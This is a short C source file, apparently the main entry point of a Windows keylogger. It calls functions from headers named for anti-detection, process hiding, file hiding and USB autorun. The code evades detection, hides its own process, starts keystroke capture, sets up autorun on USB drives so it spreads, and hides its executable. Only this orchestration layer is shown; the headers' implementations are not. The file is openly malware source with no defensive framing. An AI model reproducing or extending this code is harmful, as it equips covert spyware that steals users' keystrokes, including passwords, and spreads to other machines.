#include <windows.h>
#include "keylogger_system.h"
#include "anti_detection.h"
#include "process_hiding.h"
#include "file_hiding.h"
#include "usb_autorun.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    apply_anti_detection_techniques();

    ProcessHider* process_hider = process_hider_create();
    process_hider->hide_process(process_hider, GetCurrentProcessId());

    KeyloggerSystem* system = keylogger_system_create();
    if (system && keylogger_system_initialize(system)) {
        USBAutorun* usb_autorun = usb_autorun_create();
        char exe_path[MAX_PATH];
        GetModuleFileNameA(NULL, exe_path, MAX_PATH);
        usb_autorun_setup(usb_autorun, exe_path);

        hide_file_attribute(exe_path);

        keylogger_system_run(system);

        usb_autorun_destroy(usb_autorun);
        keylogger_system_shutdown(system);
        keylogger_system_destroy(system);
    }

    process_hider->unhide_process(process_hider, GetCurrentProcessId());
    process_hider_destroy(process_hider);

    return 0;
}